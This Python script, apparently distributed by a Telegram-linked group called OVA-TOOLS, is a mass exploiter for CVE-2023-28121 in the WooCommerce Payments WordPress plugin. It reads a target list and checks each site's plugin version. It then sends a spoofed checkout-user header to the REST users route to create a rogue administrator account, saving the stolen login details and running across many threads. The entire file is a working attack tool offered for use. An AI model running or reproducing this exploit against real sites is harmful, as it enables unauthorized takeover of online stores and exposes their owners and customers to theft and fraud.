# -*- coding: utf-8 -*-
# https://t.me/ovacloud
# OVA-TOOLS
# 🔥 OVA-TOOLS | LOGS | TOOLS | CLOUD 🔥
# WooCommerce Payments (CVE-2023-28121) Exploiter
import warnings
import requests
import re
import sys
import os
import threading
import time
import random
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, init

warnings.simplefilter('ignore', InsecureRequestWarning)

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

# Change with your email here
email = "youremail@email.com"

# ----------------------------
def run_exploit(sites):
    style2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
    malLen2 = 6
    randomName2 = ''.join(random.sample(style2, malLen2))
    randomkan = str(randomName2)
    listx = ["/", "/wp", "/wordpress"]
    if 'http' not in sites:
        sites = 'http://' + sites
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111.',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    for path in listx:
        try:
            r = requests.get(sites + path + "/wp-content/plugins/woocommerce-payments/readme.txt", headers=headers, verify=False, timeout=10)
            try:
                version = re.findall("Stable tag: (.*)", str(r.text))[0]
            except:
                version = False
            if version and int(version.replace('.', '')) < 562:
                print(' -| {} --> {}[Vuln]'.format(sites + path, fg))
                open("vuln_sites.txt", 'a').write(sites + "\n")
                data = {
                    'rest_route': '/wp/v2/users',
                    'username': 'ova-tools' + randomkan,
                    'email': email,
                    'password': '@ova@tools' + randomkan,
                    'roles': 'administrator'
                }
                session = requests.session()
                session.get(sites + path, headers=headers, verify=False, timeout=10)
                response = session.post(sites + path, data=data, headers=headers, verify=False, timeout=10)
                if response.status_code == 201:
                    open("results.txt", "a").write(sites + path + "/wp-login.php#" + 'ova-tools' + randomkan + '@ova@tools' + randomkan)
                    print(' -| {} --> {}[Successfully Add Admin]'.format(sites + path, fg))
                else:
                    print(' -| {} --> {}[Failed Add Admin]'.format(sites + path, fr))
            else:
                print(' -| {} --> {}[Not Vuln]'.format(sites + path, fr))
        except Exception as e:
            print(' -| {} --> {}[Timeout]'.format(sites, fr))

if __name__ == "__main__":
    log = """
   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud                                                                                              
                       WooCommerce Payments - Add Admin User 
    """
    print(log)
    Targetssa = input("Enter the target list file: ")
    th = input("Enter the thread count: ")
   
    
    try:
        nam = Targetssa
        time.sleep(3)
        sites = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(int(th))
        zm.map(run_exploit, sites)
    except Exception as e:
        print(str(e))
